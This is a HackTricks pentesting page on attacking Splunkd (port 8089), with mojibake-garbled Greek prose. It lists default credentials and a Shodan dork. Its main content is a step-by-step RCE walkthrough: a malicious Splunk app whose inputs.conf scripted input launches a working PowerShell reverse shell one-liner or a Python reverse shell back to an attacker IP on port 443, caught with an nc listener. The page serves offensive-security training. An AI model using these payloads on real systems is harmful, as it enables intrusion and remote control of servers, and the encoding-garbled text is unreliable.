# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

Î¤Î¿ Splunk ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î±Î½Î¬Î»Ï…ÏƒÎ·Ï‚ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†ÏÎ½** Ï€Î¿Ï… Ï€Î±Î¯Î¶ÎµÎ¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ ÏÏŒÎ»Î¿ ÏƒÏ„Î· **ÏƒÏ…Î»Î»Î¿Î³Î®, Î±Î½Î¬Î»Ï…ÏƒÎ· ÎºÎ±Î¹ Î¿Ï€Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½**. Î•Î½Ï Î¿ Î±ÏÏ‡Î¹ÎºÏŒÏ‚ Ï„Î¿Ï… ÏƒÎºÎ¿Ï€ÏŒÏ‚ Î´ÎµÎ½ Î®Ï„Î±Î½ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ **SIEM (Î”Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ ÎºÎ±Î¹ Î£Ï…Î¼Î²Î¬Î½Ï„Ï‰Î½ Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚)**, Î­Ï‡ÎµÎ¹ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Î´Î·Î¼Î¿Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿Î½ Ï„Î¿Î¼Î­Î± Ï„Î·Ï‚ **Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ·Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚** ÎºÎ±Î¹ Ï„Î·Ï‚ **ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ·Î¼Î±Ï„Î¹ÎºÎ®Ï‚ Î±Î½Î¬Î»Ï…ÏƒÎ·Ï‚**.

ÎŸÎ¹ Î±Î½Î±Ï€Ï„ÏÎ¾ÎµÎ¹Ï‚ Ï„Î¿Ï… Splunk Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ…Ï‡Î½Î¬ Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· **ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼ÎµÏÏƒÎ¿Ï…Î½ Ï‰Ï‚ **Ï€Î¿Î»ÏÏ„Î¹Î¼Î· Ï€Î·Î³Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½** Î³Î¹Î± Ï€Î¹Î¸Î±Î½Î¿ÏÏ‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î±Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎ¿Ï…Î½ Î½Î± Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎ¿Ï…Î½ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î±. **Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¸ÏÏÎ±:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
ÎŸ **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î¹ÏƒÏ„Î¿Ï Splunk ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÏ„Î· Î¸ÏÏÎ± 8000**.
{% endhint %}

## Enumeration

### Free Version

Î— Î´Î¿ÎºÎ¹Î¼Î® Ï„Î¿Ï… Splunk Enterprise Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ ÏƒÎµ **Î´Ï‰ÏÎµÎ¬Î½ Î­ÎºÎ´Î¿ÏƒÎ· Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ 60 Î·Î¼Î­ÏÎµÏ‚**, Î· Î¿Ï€Î¿Î¯Î± **Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·**. Î”ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î±ÏƒÏ…Î½Î®Î¸Î¹ÏƒÏ„Î¿ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ ÏƒÏ…ÏƒÏ„Î·Î¼Î¬Ï„Ï‰Î½ Î½Î± ÎµÎ³ÎºÎ±Î¸Î¹ÏƒÏ„Î¿ÏÎ½ Î¼Î¹Î± Î´Î¿ÎºÎ¹Î¼Î® Ï„Î¿Ï… Splunk Î³Î¹Î± Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎ¿Ï…Î½, Î· Î¿Ï€Î¿Î¯Î± **ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¾ÎµÏ‡Î½Î¹Î­Ï„Î±Î¹**. Î‘Ï…Ï„ÏŒ Î¸Î± Î¼ÎµÏ„Î±Ï„ÏÎ±Ï€ÎµÎ¯ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÏƒÏ„Î· Î´Ï‰ÏÎµÎ¬Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï€Î¿Ï… Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ ÎºÎ±Î¼Î¯Î± Î¼Î¿ÏÏ†Î® Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Ï„ÏÏÏ€Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½. ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¿ÏÎ³Î±Î½ÏÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Î»Î­Î¾Î¿Ï…Î½ Ï„Î· Î´Ï‰ÏÎµÎ¬Î½ Î­ÎºÎ´Î¿ÏƒÎ· Î»ÏŒÎ³Ï‰ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏÎ½ Ï€ÏÎ¿Ï‹Ï€Î¿Î»Î¿Î³Î¹ÏƒÎ¼Î¿Ï, Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î¿ÏÎ½ Ï€Î»Î®ÏÏ‰Ï‚ Ï„Î¹Ï‚ ÏƒÏ…Î½Î­Ï€ÎµÎ¹ÎµÏ‚ Ï„Î·Ï‚ Î­Î»Î»ÎµÎ¹ÏˆÎ·Ï‚ Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÏ„ÏÎ½/ÏÏŒÎ»Ï‰Î½.

### Default Credentials

Î£Îµ Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Splunk, Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÎµÎ¯Î½Î±Î¹ **`admin:changeme`**, Ï„Î± Î¿Ï€Î¿Î¯Î± ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ Î²Î¿Î»Î¹ÎºÎ¬ ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, **Î· Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… Splunk** Î¿ÏÎ¯Î¶ÎµÎ¹ **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±** **ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚**. Î•Î¬Î½ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½, Î±Î¾Î¯Î¶ÎµÎ¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î³Î¹Î± ÎºÎ¿Î¹Î½Î­Ï‚ Î±Î´ÏÎ½Î±Î¼ÎµÏ‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏŒÏ€Ï‰Ï‚ `admin`, `Welcome`, `Welcome1`, `Password123`, Îº.Î»Ï€.

### Obtain Information

Î‘Ï†Î¿Ï ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ¼Îµ ÏƒÏ„Î¿ Splunk, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± **Ï€ÎµÏÎ¹Î·Î³Î·Î¸Î¿ÏÎ¼Îµ ÏƒÎµ Î´ÎµÎ´Î¿Î¼Î­Î½Î±,** Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ **Î±Î½Î±Ï†Î¿ÏÎ­Ï‚**, Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ **Ï€Î¯Î½Î±ÎºÎµÏ‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…**, **Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚** Î±Ï€ÏŒ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Splunkbase ÎºÎ±Î¹ Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚.\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ±: Î¤Î¿ Splunk Î­Ï‡ÎµÎ¹ Ï€Î¿Î»Î»Î¿ÏÏ‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ±**, ÏŒÏ€Ï‰Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Django server-side, REST endpoints, scripted inputs ÎºÎ±Î¹ alerting scripts. ÎœÎ¹Î± ÎºÎ¿Î¹Î½Î® Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î·Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ Î­Î½Î±Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Splunk ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï‡ÏÎ®ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ scripted input.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ Splunk Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ ÏƒÎµ Windows Î® Linux hosts, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î¿ÏÎ½ scripted inputs Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ Bash, PowerShell Î® Batch scripts.

### Shodan

* `Splunk build`

## RCE

### Create Custom Application

ÎœÎ¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ **Python, Batch, Bash Î® PowerShell scripts**.\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **Ï„Î¿ Splunk Î­ÏÏ‡ÎµÏ„Î±Î¹ Î¼Îµ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ Python**, Î¿Ï€ÏŒÏ„Îµ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ ÏƒÎµ **ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Windows** Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ ÎºÏÎ´Î¹ÎºÎ± python.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ [**Î±Ï…Ï„ÏŒ**](https://github.com/0xjpuff/reverse\_shell\_splunk) Ï„Î¿ Ï€Î±ÎºÎ­Ï„Î¿ Splunk Î³Î¹Î± Î½Î± Î¼Î±Ï‚ Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹. ÎŸ **Ï†Î¬ÎºÎµÎ»Î¿Ï‚ `bin`** ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ repo Î­Ï‡ÎµÎ¹ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î³Î¹Î± [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ÎºÎ±Î¹ [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Î‘Ï‚ Ï€ÏÎ¿Ï‡Ï‰ÏÎ®ÏƒÎ¿Ï…Î¼Îµ Î²Î®Î¼Î±-Î²Î®Î¼Î±.

Î“Î¹Î± Î½Î± Ï„Î¿ ÎµÏ€Î¹Ï„ÏÏ‡Î¿Ï…Î¼Îµ Î±Ï…Ï„ÏŒ, Ï€ÏÎ­Ï€ÎµÎ¹ Ï€ÏÏÏ„Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Splunk Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´Î¿Î¼Î® Ï†Î±ÎºÎ­Î»Ï‰Î½:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
ÎŸ **`bin`** Ï†Î¬ÎºÎµÎ»Î¿Ï‚ Î¸Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ **ÏƒÎµÎ½Î¬ÏÎ¹Î± Ï€Î¿Ï… ÏƒÎºÎ¿Ï€ÎµÏÎ¿Ï…Î¼Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ** (ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î­Î½Î± **PowerShell** reverse shell), ÎºÎ±Î¹ Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Ï‚ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ Î¸Î± Î­Ï‡ÎµÎ¹ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `inputs.conf` Î¼Î±Ï‚. Î¤Î¿ reverse shell Î¼Î±Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **PowerShell one-liner:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) Î»Î­ÎµÎ¹ ÏƒÏ„Î¿ Splunk **Ï€Î¿Î¹Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹** ÎºÎ±Î¹ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»ÎµÏ‚ ÏƒÏ…Î½Î¸Î®ÎºÎµÏ‚. Î•Î´Ï ÏÏ…Î¸Î¼Î¯Î¶Î¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï‰Ï‚ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎºÎ±Î¹ Î»Î­Î¼Îµ ÏƒÏ„Î¿ Splunk Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎºÎ¬Î¸Îµ 10 Î´ÎµÏ…Ï„ÎµÏÏŒÎ»ÎµÏ€Ï„Î±. Î— Î´Î¹Î¬ÏÎºÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¬Î½Ï„Î± ÏƒÎµ Î´ÎµÏ…Ï„ÎµÏÏŒÎ»ÎµÏ€Ï„Î±, ÎºÎ±Î¹ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ (ÏƒÎµÎ½Î¬ÏÎ¹Î¿) Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î±Î½ Î±Ï…Ï„Î® Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÎ¿ÏÏƒÎ±.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Î§ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Ï„Î¿ `.bat` Î±ÏÏ‡ÎµÎ¯Î¿, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Î±Î½Î±Ï€Ï„Ï…Ï‡Î¸ÎµÎ¯ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Î¹ Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î·Î½ PowerShell one-liner.

Î¤Î¿ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ Î²Î®Î¼Î± ÎµÎ¯Î½Î±Î¹ Î½Î± ÎµÏ€Î¹Î»Î­Î¾Î¿Ï…Î¼Îµ `Install app from file` ÎºÎ±Î¹ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Î ÏÎ¹Î½ Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î®, Î±Ï‚ Î¾ÎµÎºÎ¹Î½Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î±Î½ listener Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Netcat Î® Ï„Î¿ [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Î£Ï„Î· ÏƒÎµÎ»Î¯Î´Î± `Upload app`, ÎºÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ browse, ÎµÏ€Î¹Î»Î­Î¾Ï„Îµ Ï„Î¿ tarball Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ±Î¼Îµ Î½Ï‰ÏÎ¯Ï„ÎµÏÎ± ÎºÎ±Î¹ ÎºÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ `Upload`. ÎœÏŒÎ»Î¹Ï‚ **Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®**, Î¸Î± **Î»Î¬Î²Î¿Ï…Î¼Îµ Î­Î½Î± reverse shell** ÎºÎ±Î¸ÏÏ‚ Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Î¸Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÏƒÎµ `Enabled`.

#### Linux

Î‘Î½ Î±ÏƒÏ‡Î¿Î»Î¿ÏÎ¼Î±ÏƒÏ„Î±Î½ Î¼Îµ Î­Î½Î±Î½ **Linux host**, Î¸Î± Î­Ï€ÏÎµÏ€Îµ Î½Î± **ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„Î¿ÏÎ¼Îµ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Python `rev.py`** Ï€ÏÎ¹Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ tarball ÎºÎ±Î¹ Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î®. Î— Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î¸Î± Î®Ï„Î±Î½ Î· Î¯Î´Î¹Î±, ÎºÎ±Î¹ Î¸Î± Î±Ï€Î¿ÎºÏ„Î¿ÏÏƒÎ±Î¼Îµ Î¼Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ· reverse shell ÏƒÏ„Î¿Î½ Î±ÎºÏÎ¿Î±Ï„Î® Netcat Î¼Î±Ï‚ ÎºÎ±Î¹ Î¸Î± Î¾ÎµÎºÎ¹Î½Î¿ÏÏƒÎ±Î¼Îµ.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

Î£Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± ÎµÎ¾Î®Î³Î·ÏƒÎ· Î³Î¹Î± Ï„Î¿ Ï€ÏÏ‚ Î±Ï…Ï„Î® Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ ÎµÏ€Î¹Î¼Î¿Î½Î®:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
